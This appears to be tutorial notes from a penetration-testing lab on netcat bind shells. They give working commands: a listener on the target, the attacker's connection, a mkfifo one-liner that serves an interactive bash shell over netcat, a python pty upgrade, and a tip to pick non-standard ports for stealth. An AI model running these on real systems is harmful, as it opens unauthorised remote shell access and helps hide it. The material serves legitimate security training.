
A **bind shell** is when the **target system** opens a port and **listens for connections** from your attack machine.  
Once you connect, you gain remote interaction with the target's shell.

- **Client = Attacker**
    
- **Server = Target**
    

---

## **2. Basic Bind Shell with Netcat**

### **Step 1: Start Listener on the Target**

On the **target machine**:

```bash
nc -lvnp 7777
```

Output:

```
Listening on [0.0.0.0] port 7777
```

This makes the **target** listen for connections on port **7777**.

---

### **Step 2: Connect from the Attacker**

On the **attacker machine**:

```bash
nc -nv 10.129.41.200 7777
```

Output:

```
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

At this point, you have a basic connection — but **not a functional shell**, just a raw pipe for input/output.

---

## **3. Upgrading to a Real Bind Shell**

To serve an interactive bash shell, use **named pipes (FIFO)** on the **target**.

### **Step 3: Setup Bind Bash Shell (Target)**

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Explanation:**

- `mkfifo /tmp/f` → Creates a named pipe for input/output.
    
- `bash -i` → Starts an interactive shell.
    
- Pipes input and output through **Netcat**.
    

---

### **Step 4: Connect to the Shell (Attacker)**

```bash
nc -nv 10.129.41.200 7777
```

Once connected, you now have a real interactive shell:

```
target@server:~$ whoami
target
```

---

## **Key Notes**

- Bind shells are **target-initiated**, so **firewalls must allow inbound connections** to the listening port.
    
- Use **non-standard ports** (e.g., 8080, 9001) for stealth.
    
- Always upgrade to a fully interactive shell if possible, using tools like:
    
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
